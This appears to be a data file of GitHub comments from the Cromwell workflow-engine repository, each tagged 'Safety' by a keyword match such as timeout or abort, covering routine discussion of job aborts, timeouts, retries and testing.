Safety,The slick exceptions could technically cause this but no this is more generally due to the metadata building process being very expensive therefore causing all kinds of timeouts / errors.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2519#issuecomment-321682962:169,timeout,timeouts,169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2519#issuecomment-321682962,1,['timeout'],['timeouts']
Safety,"The tests broke as the code expects Kanin to be running but it isn't. This will also break run more, I only use server these days to avoid the color highlighting. It all ties back to the inability to turn the instrumentation odd. Go ahead and review as is, whatever solution to this which is applied is unlikely to affect the actual code part all that much",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/269#issuecomment-154437437:133,avoid,avoid,133,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/269#issuecomment-154437437,1,['avoid'],['avoid']
Safety,"The timestamps are wrong... This was hanging for > 12 hours. Also, I cannot ctl-C I have to `kill`. ```; [2016-10-20 00:09:40,74] [info] SingleWorkflowRunnerActor writing metadata to /home/lichtens/test_eval/eval-gatk-protected/scripts/crsp_validation/crsp_validation_gatkp_run_local_paths.json.metadata.json; [2016-10-20 00:09:41,04] [info] SingleWorkflowRunnerActor workflow finished with status 'Succeeded'.; [2016-10-20 00:09:41,05] [info] WorkflowManagerActor: Received shutdown signal. Aborting all running workflows... ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1594#issuecomment-255101545:492,Abort,Aborting,492,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1594#issuecomment-255101545,1,['Abort'],['Aborting']
Safety,"The token message is a safety-catch in the token distributer. If the job actor exits in an unexpected way without returning its execution token, the token distributer will spot that and reclaim the token anyway. . So the underlying issue here is that the job actor is crashing or exiting inappropriately. EDIT: Here, ""job actor"" == `EJEA`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1612#issuecomment-255765188:23,safe,safety-catch,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1612#issuecomment-255765188,1,['safe'],['safety-catch']
Safety,"The wheel has chosen @Horneth and @mcovarr. I hope the fundamental choice of how abort now works isn't too controversial (as I understand it, it's how things work currently) but I'm happy to do a meet 'n' discuss if you want.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/759#issuecomment-215548808:81,abort,abort,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/759#issuecomment-215548808,1,['abort'],['abort']
Safety,The workflow d800c362-e8e7-48e2-bb08-3b88226307e9 has been aborting on cromwell1 since 2017-06-27. Rawls is still trying as of the time of me posting this.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1976#issuecomment-327944618:59,abort,aborting,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1976#issuecomment-327944618,1,['abort'],['aborting']
Safety,"There are a few follow ups that I will make new tickets for, to avoid delaying the merge on this PR:. 1. Renaming the method to processEventsAndEmitWarnings would make it more clear what's going on; 2. Accounting for metadata generated at the parent or root workflows level separately from contributions from their subworkflows",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6641#issuecomment-1006911032:64,avoid,avoid,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6641#issuecomment-1006911032,2,['avoid'],['avoid']
Safety,"There are two tables in the cromwell database that are out of sync. Unofficially, if one knows what they're looking for, one can edit the values directly in the database. Often the case is the `WorkflowStoreEntry` doesn't have a record for the workflow, thus it cannot be aborted or resumed-on-restart, yet the last row in `MetadataEntry` says the workflow is still `Running`. A ""reconciler"" could write a final row into `MetadataEntry` with Aborted/Success/Fail. This could be called:; - Manually by a user/service; - Automatically whenever a user requests status of a workflow; - Automatically by a MetadataEntry sweeper looking for workflows w/o a finalization and no row in WorkflowStoreEntry; - Other?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334526788:272,abort,aborted,272,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334526788,3,"['Abort', 'abort']","['Aborted', 'aborted']"
Safety,"There is a Pull request in for AWS CLI call retry's which will mitigate; some of the problem. Currently full retries of tasks are not supported via; Cromwell Server coordinating with the AWS Batch backend. Having said that,; you could identify the AWS Batch Job Description and edit it to create a; new revision such that the revision uses the AWS Batch retry strategy. This; will mean that AWS Batch will retry any job that doesn't exit cleanly; (return code 0 or container host is terminated) up to a max number of; times. When that happens, the job ID remains the same so as far as Cromwell; knows it is the same job. I haven't had a chance to test this out myself; but it's on my to do list. Let me know if you try it. If it works the same; approach would allow for recovery in the case of Spot interruption. https://docs.aws.amazon.com/batch/latest/userguide/job_retries.html; https://docs.aws.amazon.com/batch/latest/userguide/job_definition_parameters.html#retryStrategy. On Wed, Oct 14, 2020 at 2:40 PM Richard Davison <notifications@github.com>; wrote:. > Originally posted this two in the JIRA issue tracker back in August.; > Reposting here since it didn't get a response over there:; > https://broadworkbench.atlassian.net/browse/BA-6548; >; > Hello everyone,; >; > I am attempting to use the AWS Batch backend for Cromwell to run a wdl; > script which runs several subjobs in parallel. I believe the correct; > parlance is a scatter. I noticed that in some of the jobs of the scatter,; > some reference files failed to download from S3 even though they existed; > (Connection Reset by Peer). This failure caused the overall job to fail; > after one hour of running.; >; > I believe this issue was reported and fixed before, around May 2019, but; > recently, in June 2020, it appears the AWS Batch backend was majorly; > overhauled (by @markjschreiber <https://github.com/markjschreiber>,; > thanks! Also, tagging you because I suspect you might be the resident; > expert here :) ), and th",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780:770,recover,recovery,770,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780,1,['recover'],['recovery']
Safety,"There's a good forum post on this topic here, including not only `includeKey` and `excludeKey` but also increasing Akka HTTP timeouts. We might want to change those timeout defaults in `reference.conf` if users are seeing this routinely even with those filters. https://gatkforums.broadinstitute.org/wdl/discussion/10209/retrieving-metadata-for-large-workflows",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2519#issuecomment-326019694:125,timeout,timeouts,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2519#issuecomment-326019694,2,['timeout'],"['timeout', 'timeouts']"
Safety,They both have a `return valid swagger` test case. I think the first thing to try is increase this timeout anyway so I'll just do that on both.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4247#issuecomment-429907743:99,timeout,timeout,99,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4247#issuecomment-429907743,1,['timeout'],['timeout']
Safety,"Thibault;; You're exactly right, I hadn't compiled against the right branch with this fix. Apologies for wasting your time looking at this, once I got the most up to date version compiled it avoided this problem and the GCP test run I mentioned ran all the way through cleanly to the end. Brilliant, thank you for all the help getting this in place and sorry again for the erroneous report.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4471#issuecomment-446138096:191,avoid,avoided,191,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4471#issuecomment-446138096,1,['avoid'],['avoided']
Safety,"This PR is a continuation of PR https://github.com/broadinstitute/cromwell/pull/4938. The idea is to propagate line numbers to the WOM structures, so you could report an error to the user with correct source locations. . In dxWDL, I need this also to recover the original ordering of the source code. The WOM structure is a partially sorted graph. For example, in a program like: . ```wdl; workflow foo {; call A; call B; }; ```. you don't know what came first, `A` or `B`, because they are unordered.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4977#issuecomment-493627722:251,recover,recover,251,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4977#issuecomment-493627722,1,['recover'],['recover']
Safety,"This PR merges into @Horneth's branch. Good news: The tests-formerly-known-as-root are now running under `server`!; Bad news:; ```; *** 3 TESTS FAILED ***; SimpleWorkflowActorSpec:; A WorkflowActor should ; - start, run, succeed and die *** FAILED *** (10 seconds, 174 milliseconds); java.lang.AssertionError: timeout (10 seconds) waiting for 1 messages on InfoFilter(None,Right(Starting calls: wf_hello.hello:NA:1$),false); at akka.testkit.EventFilter.intercept(TestEventListener.scala:114); at cromwell.CromwellTestKitSpec$.waitForInfo(CromwellTestKitSpec.scala:129); at cromwell.SimpleWorkflowActorSpec.$anonfun$startingCallsFilter$1(SimpleWorkflowActorSpec.scala:186); ...; SimpleWorkflowActorSpec:; A WorkflowActor should ; - fail when a call fails *** FAILED *** (10 seconds, 35 milliseconds); java.lang.AssertionError: timeout (10 seconds) waiting for 1 messages on InfoFilter(None,Right(Starting calls: wf_goodbye.goodbye:NA:1$),false); at akka.testkit.EventFilter.intercept(TestEventListener.scala:114); at cromwell.CromwellTestKitSpec$.waitForInfo(CromwellTestKitSpec.scala:129); at cromwell.SimpleWorkflowActorSpec.$anonfun$startingCallsFilter$1(SimpleWorkflowActorSpec.scala:186); ...; WorkflowExecutionActorSpec:; WorkflowExecutionActor ; - should allow a backend to tell it to retry... up to a point *** FAILED *** (10 seconds, 170 milliseconds); java.lang.AssertionError: timeout (10 seconds) waiting for 3 messages on InfoFilter(None,Right(Starting calls: wf_hello.hello),false); at akka.testkit.EventFilter.intercept(TestEventListener.scala:114); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActorSpec.$anonfun$new$1(WorkflowExecutionActorSpec.scala:84); ```. Still, as this isn't merging into develop feel free to press merge if you'd like.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3375#issuecomment-371344580:310,timeout,timeout,310,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3375#issuecomment-371344580,3,['timeout'],['timeout']
Safety,"This change seems to be causing deadlocks or timeouts or ??? in some integration tests, looking into it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7128#issuecomment-1550055307:45,timeout,timeouts,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7128#issuecomment-1550055307,1,['timeout'],['timeouts']
Safety,"This doc predates that ""we should fix aborts"" google doc and is effectively a subset of that. I say effectively in that the specifics of what this ticket are asking for might be different from that doc, but that doc should be the authoritative one of the two.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1139#issuecomment-323877156:38,abort,aborts,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1139#issuecomment-323877156,1,['abort'],['aborts']
Safety,"This happens because the EJEAs are not aborted directly. Because they're waiting for tokens the cycle looks like this:; - WEA is waiting for all EJEAs to finish; - All running BJEAs get aborted; - This releases tokens so the next group of EJEAs can begin; - They immediately get aborted; - this releases tokens so the next group of EJEAs can begin; - Ad nauseam, until all queued EJEAs start and get aborted",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1600#issuecomment-255799043:39,abort,aborted,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1600#issuecomment-255799043,4,['abort'],['aborted']
Safety,"This is a problem we have ran into as well. Our solution for now was to patch cromwell to trap SIGUSR1/2 signals to modify the rc file. These are a pre-signal fired by SGE to let the job know it's about to be killed because of requested-resource limits (https://github.com/princessmaximacenter/cromwell/commit/fe5dab7505f089f99d56b1a7eefac9eb108f5898). However, patching Cromwell every release is a bit of a bother and your solution looks a lot more promissing. Looking at the different recurring discussions on this topic I would strongly urge you to to make the timeout a recurring poll instead of a one-time-fire; I am not well versed in scala so it might be that this is already what you do =).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-424700349:564,timeout,timeout,564,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-424700349,1,['timeout'],['timeout']
Safety,This is included in the Aborts design doc: https://docs.google.com/document/d/1B0FElJXOp4IP-v24C62CLsC0JQMbQPjaIrjOwnDqko8/edit . Closing,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1504#issuecomment-287462701:24,Abort,Aborts,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1504#issuecomment-287462701,1,['Abort'],['Aborts']
Safety,"This looks like a feature request along the line to what @cjllanwarne suggested. It could be a third execution mode like ""AbortJobsOnFailure"".",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2517#issuecomment-342588430:122,Abort,AbortJobsOnFailure,122,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2517#issuecomment-342588430,1,['Abort'],['AbortJobsOnFailure']
Safety,"This passes the K.I.S.S. principle, but I personally _hate_ the ask pattern, as it leads to timeouts and exceptions when the system gets busy. One should be theoretically be able to have the two actors to `tell` / `receive` messages instead, though I don't have the code ready at this second.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/308#issuecomment-161824332:92,timeout,timeouts,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/308#issuecomment-161824332,1,['timeout'],['timeouts']
Safety,"This seems like a pretty recoverable error. It fails the zamboni workflow but not the cromwell workflow. So it can easily be overcome with a reconsider in zamboni. Ideally the Zamboni workflow would catch and be robust to these sorts of things, or at least log the response.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216873574:25,recover,recoverable,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216873574,1,['recover'],['recoverable']
Safety,"This small change could make it portable on any esoteric distribution / container. > also risks breaking an unknown number of cases that work fine now. Not using env is more ""risky"" in term of portability, as it would be less portable. This is due to unix requirements",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7469#issuecomment-2269916313:90,risk,risks,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7469#issuecomment-2269916313,2,['risk'],"['risks', 'risky']"
Safety,"This was reported by another [FireCloud user](https://gatkforums.broadinstitute.org/firecloud/discussion/10352/removing-workflows-stuck-in-the-submitted-or-aborting-state#latest); Is there a way that we can force these jobs into Aborted so that the workspace stops appearing as ""Running""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334862844:156,abort,aborting-state,156,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334862844,2,"['Abort', 'abort']","['Aborted', 'aborting-state']"
Safety,"This would be extremely useful for us. We're currently having to deal with several problems that would be helped by an automated retry ability. . The first problems is what David said, we have tools that can fail sometimes due to GCS issues and being able to restart when that happens would be useful. We're working on making our code more robust to that, but it's difficult to completely fix the problem. Having to restart a workflow with 10s of thousands of jobs because 2 failed is pretty annoying. The second problem is out of memory issues. We have thousands of jobs, and most will run with a small amount of memory, but some of them will need more. It's difficult to predict ahead of time which shards will need more since it's a function of the data rather than of the file size. Having a way to automatically retry these shards with increased memory would be really valuable since it would let us provision for the average shard rather than the worst case.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1991#issuecomment-315406584:673,predict,predict,673,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1991#issuecomment-315406584,1,['predict'],['predict']
Safety,"Thoughts for a Monday Tech Talk™️:. Say we run a workflow with a 100-wide scatter and the floating Docker tags are resolved to hashes during workflow initialization. 90 of the jobs launch, but then the server goes down. The server comes up some time later and recovers the first 90 running jobs, but in the meantime the floating Docker tag has moved to a new version. We rerun the workflow initialization and calculate a different hash for the remaining 10 shards of the scatter. . It seems the hash for a Docker tag for a particular workflow should be persisted to be able to handle this case. I also wonder per @cjllanwarne if we shouldn't keep this activity in the `JobPreparationActor` to avoid knowingly creating a system that we'll have to replace when we implement dynamic dispatch. Keeping this in `JobPreparationActor` would also give us greater ability to resolve expressions for Docker tags than if we do this earlier in the workflow lifecycle.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-289168497:260,recover,recovers,260,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-289168497,2,"['avoid', 'recover']","['avoid', 'recovers']"
Safety,"To be clear I'm not 💩 💩 ing the multiple ServiceRegistryActor idea, just pointing out one potential gotcha I can see. I have reservations about my hacky ""crank up the timeout"" ""solution"" in the #1057 PR and would definitely like to look at other options like this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1060#issuecomment-228143719:167,timeout,timeout,167,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1060#issuecomment-228143719,2,['timeout'],['timeout']
Safety,"To be clear, fail-fast should not attempt to abort currently running calls even if those calls might otherwise continue to run for a long time?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198424257:45,abort,abort,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198424257,2,['abort'],['abort']
Safety,"To get more specific on this one (as Jose has informed me that the issue of Cromwell status updating is really a collection of different things) what it looks like here is we had a recent slew of connection timeouts when Cromwell tried to talk to the DB, on Saturday morning it appears. Perhaps we need to up the wait time from 5000ms?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/800#issuecomment-217917736:207,timeout,timeouts,207,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/800#issuecomment-217917736,1,['timeout'],['timeouts']
Safety,"To stick to our launch schedule for the GATK-aaS alpha, I'd really like to see this functionality (enable Cromwell server to treat SIGINT as abort) go in this week. . Is that going to be feasible? Who should David sync with to figure out how best to do it?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-175717937:141,abort,abort,141,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-175717937,1,['abort'],['abort']
Safety,"ToL about a few ways to assert deeper on this -- for JES, you could label; the VM with a random number (so you can find it later), then assert you can; find it out of band using gcloud commands, do the abort, then assert it; goes away. Similar for the local backend using a command with some unique; value that you can grep a ps for. -------------------------------; Kristian Cibulskis; Engineering Director, Data Sciences & Data Engineering; Broad Institute of MIT and Harvard; kcibul@broadinstitute.org. On Thu, Mar 23, 2017 at 3:37 PM, Jeff Gentry <notifications@github.com>; wrote:. > a big issue w/ abort is not that it doesn't claim it aborted in the; > response but all hell breaks loose internally :); >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2088#issuecomment-288836659>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ABW4gzQqYfBKEOyRH6s2_KiWyfqyG647ks5rosn9gaJpZM4MnQcP>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2088#issuecomment-288910885:202,abort,abort,202,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2088#issuecomment-288910885,3,['abort'],"['abort', 'aborted']"
Safety,"ToL: (sorry for the seagulling...) I did find the names and semantics of these new filters a tiny bit confusing and it started me wondering whether these combinations of various label filters are likely to get harder to manage as more filter types get dreamed up. At the risk of ""if you have a hammer every problem starts to look like a nail"", I wonder whether a basic expression style syntax will be a good idea at some point, something like e.g.:. (""Label1"" && ""Label2"" && !""Label3"") || ""Label4"". If that ever does sound worth pursuing, there's a cool looking (previously core Scala) library which might be able to help: https://github.com/scala/scala-parser-combinators",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3800#issuecomment-398948843:271,risk,risk,271,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3800#issuecomment-398948843,1,['risk'],['risk']
Safety,"ToL:. Looking at this, I wonder whether an easier route to the upgrade script is to make another implementation of this `WdlWriter` typeclass for draft 2 `WdlNamespace`. It leaves us further away from funneling draft 2 and draft 3 through the same object mode (and the massive code deletion we'd get from that)l, but it might be a much more expedient (and maybe safer?) way of achieving the upgrade script?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3601#issuecomment-387452833:362,safe,safer,362,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3601#issuecomment-387452833,1,['safe'],['safer']
Safety,"Tried tracing through the latest `CromwellTestkitSpec`, but I'm not entirely sure which of the various `ask` are timing out. For now 👍 assuming Travis gets happy. I imagine the 10 second default timeouts are just on the cusp of the length of the `SingleToArrayCoercion` wdl runs, and may succeed just in time on a re-run. So maybe kick it a few times until one can go back (again) and figure out what we actually want for the various test durations and blocking within our future/actor/ask/retry soup?. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1045/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1045#issuecomment-227654083:195,timeout,timeouts,195,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1045#issuecomment-227654083,1,['timeout'],['timeouts']
Safety,"Trivially happened again, same error... Output of `Ctl-\`:. ```; ""shutdownHook1"" #44 prio=5 os_prio=0 tid=0x00007fdbcc9ce000 nid=0x10a8 waiting on condition [0x00007fd9ccfce000]; java.lang.Thread.State: TIMED_WAITING (sleeping); at java.lang.Thread.sleep(Native Method); at cromwell.engine.workflow.WorkflowManagerActor$$anonfun$addShutdownHook$1.apply$mcV$sp(WorkflowManagerActor.scala:125); at scala.sys.ShutdownHookThread$$anon$1.run(ShutdownHookThread.scala:34). ""pool-1-thread-20"" #95 prio=5 os_prio=0 tid=0x00007fdaa80c0000 nid=0xa56 waiting on condition [0x00007fda90575000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-19"" #94 prio=5 os_prio=0 tid=0x00007fdaa80be800 nid=0xa55 waiting on condition [0x00007fda90676000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.ja",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:638,Unsafe,Unsafe,638,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['Unsafe'],['Unsafe']
Safety,"Update: To avoid having all Cromwell instances send same data points to Grafana, now the config is an `Option[A]`. This way we can set it for the summarizer instance (PR [#2592](https://github.com/broadinstitute/firecloud-develop/pull/2592)) and have only 1 instance send data points. Testing from Dev:. ![Screen Shot 2021-07-06 at 2 10 25 PM](https://user-images.githubusercontent.com/16748522/124667085-edb05780-de7c-11eb-8dbd-888b13d702f7.png)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-875084254:11,avoid,avoid,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-875084254,1,['avoid'],['avoid']
Safety,"We are trying to be 100% heads down on cwl work for probably another couple of weeks. If this is a raging fire we can divert attention from that but that not without cost towards that and the ripple effect on other goals. So is this “this sucks please fix soon” or “OMG we’re blocked, at the risk of cheesing off other users this needs to be fixed right this second”",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3156#issuecomment-358518084:292,risk,risk,292,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3156#issuecomment-358518084,1,['risk'],['risk']
Safety,We made changes to avoid changing the model that was returned (opting for metadata instead) those changes aren't reflected here. I will update this PR shortly.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/830#issuecomment-221861480:19,avoid,avoid,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/830#issuecomment-221861480,1,['avoid'],['avoid']
Safety,We really do have a business case for doing this once per workflow. Having this at the task level will run prepare() / cleanup() as many times as we have calls to run on that backend. This specific use case also involves some sensitive data which we'd particularly like to avoid making many copies of unnecessarily.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/439#issuecomment-185479460:273,avoid,avoid,273,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/439#issuecomment-185479460,1,['avoid'],['avoid']
Safety,"We recently adjusted this timeout, I would try again with the latest `develop` build. The errors are likely happening because Cromwell is putting work into its IO queue faster than it can finish it. There's a backpressure system that aims to prevent this by stopping Cromwell picking up new work when IO operations aren't getting finished fast enough, but in this case it isn't responsive enough to keep you out of trouble. If you continue seeing these errors, you can tune down `system.io.command-backpressure-staleness` to make the engine more sensitive to long IO queues.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-2296872912:26,timeout,timeout,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-2296872912,2,['timeout'],['timeout']
Safety,We redundantly re-verified the absence of the problem class [0] by [unzipping](https://docs.oracle.com/javase/tutorial/deployment/jar/unpack.html) the shipping Cromwell JAR and manually checking that the path is empty. [0] `org/apache/logging/log4j/core/lookup/JndiLookup.class`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-996997802:3,redund,redundantly,3,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-996997802,1,['redund'],['redundantly']
Safety,We should probably be clear (particularly for hotfix accepters) that this is unlikely to fix-fix aborts but specifically what we believe it'll resolve.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2154#issuecomment-292595363:97,abort,aborts,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2154#issuecomment-292595363,2,['abort'],['aborts']
Safety,"We'd need a way to detect that a job was timed out rather than genuinely preempted (either another error code or by analyzing the total run time).; We'd also need a special case in the ""start this as a preemptible VM?"" logic to not start the subsequent job preemptibly.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2168#issuecomment-293705422:19,detect,detect,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2168#issuecomment-293705422,1,['detect'],['detect']
Safety,"Well if it's doing it only when the job is finished I would even make it `warn` instead of `info`. > Right now a workflow is not robust enough to run it on a/our HPC, see also on gitte:; > Peter van 't Hof @ffinfo Aug 26 19:05; > ye I see what you mean but it's the only way. When in SGE your job is killed he never get to the point of $? > rc; > so cromwell can not detect is a job is killed, meaning it will end in a endless loop polling for rc what never will come anymore; > in this case a drmaa connection would be better; > but not so sure if that still works on a start of a server; > I think there it's bound to a session; > ; > Peter van 't Hof @ffinfo Aug 26 19:11; > but only have seen the dmraa implementation inside Gatk Queue; > ; > Peter van 't Hof @ffinfo Aug 26 19:28; > when using qstat i would use it only once for the complete pool instead executing it for each job; > so then you get an output like this:; > `; > job-ID prior name user state submit/start at queue slots ja-task-ID; > 9923549 0.00000 cromwell_1 pjvan_thof qw 08/26/2016 17:23:16 1; > 9923550 0.00000 cromwell_1 pjvan_thof qw 08/26/2016 17:23:16 